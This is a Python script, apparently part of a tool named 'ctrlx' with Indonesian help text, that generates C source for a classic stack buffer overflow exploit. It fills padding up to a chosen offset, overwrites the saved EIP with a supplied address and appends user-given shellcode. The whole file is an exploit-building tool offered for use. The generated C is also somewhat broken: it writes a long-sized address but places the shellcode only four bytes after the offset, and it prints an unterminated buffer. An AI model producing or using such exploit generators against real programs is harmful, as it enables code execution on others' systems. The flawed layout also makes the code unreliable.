import argparse
import textwrap

def run(raw_args):
    parser = argparse.ArgumentParser(
        prog="ctrlx zkf --type e3c",
        description="Template Exploit Buffer Overflow (C format)",
        epilog="Contoh: --offset 260 --eip 0xdeadbeef --shellcode \"\\x90...\""
    )

    parser.add_argument("--offset", type=int, required=True, help="Jumlah karakter padding sebelum EIP")
    parser.add_argument("--eip", required=True, help="Alamat EIP dalam format hex (misal: 0xdeadbeef)")
    parser.add_argument("--shellcode", required=True, help="Shellcode (escaped string)")
    parser.add_argument("--vuln-name", default="exploit", help="Nama file target (tanpa ekstensi)")

    args = parser.parse_args(raw_args)

    c_code = f"""
    // Generated Exploit Template - CTRLX
    #include <string.h>
    #include <stdio.h>

    char shellcode[] = "{args.shellcode}";

    int main() {{
        char buffer[512];
        memset(buffer, 'A', {args.offset});
        *(long*)(buffer + {args.offset}) = {args.eip};
        memcpy(buffer + {args.offset + 4}, shellcode, strlen(shellcode));
        printf("%s", buffer);
        return 0;
    }}
    """

    return textwrap.dedent(c_code).strip()
